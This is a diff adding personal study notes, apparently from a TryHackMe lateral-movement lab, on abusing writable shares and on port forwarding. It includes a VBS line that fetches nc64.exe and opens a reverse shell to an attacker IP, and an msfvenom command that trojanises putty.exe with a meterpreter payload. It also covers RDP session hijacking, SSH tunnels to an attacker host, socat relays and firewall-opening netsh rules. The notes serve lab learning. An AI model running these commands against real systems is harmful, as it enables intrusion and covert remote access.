@@ -516,3 +516,47 @@ PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credent
 
 
 ### Abusing Behaviour
+- find writables shares + put file with payload
+```
+# .vbs
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+
+# .exe
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+# no logged off RDP session
+PsExec64.exe -s cmd.exe
+query user
+tscon SESSION_ID /dest:rdp-tcp#6
+
+From Windows 2019 only with password
+```
+### Port Forwarding
+- Comprimised host ==> jump box
+- console usage
+- REMOTE Port Forwarding
+  - Tunnel from Compromised to Attacker
+    - create user for tunnel
+    - useradd tunneluser -m -d /home/tunneluser -s /bin/true
+    - ssh tunneluser@ATTACKER -R 3389:ISOLATED_SERVER:3389 -N
+      - -N => prevent client from requesting shell
+      - _R => remote
+
+- LOCAL Port FOrwarding
+  - ssh tunneluser@attacker -L *:PORT_COMPROMISED:LOCAL_HOST:PORT_ON_ATTACKRR -N
+    - *:PORT_LOCAL = local socket used by compromised
+  - Open Port on compromised
+    - netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+
+- Socat
+  - file in pivot
+  - socat TCP4-LISTEN:1234,fork TCP4:TARGET:4321
+  - Open PORT 1234 on the pivot
+  - Firewall Rule
+    - netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+
+- Dynamic Port Forwarding
+  - several connections
+  - ssh tunneluser@attacker_ip -R 9050 -N
+    - SOCK proxy on port 9050
+    - proxychains (learn more about it) => same port as ssh
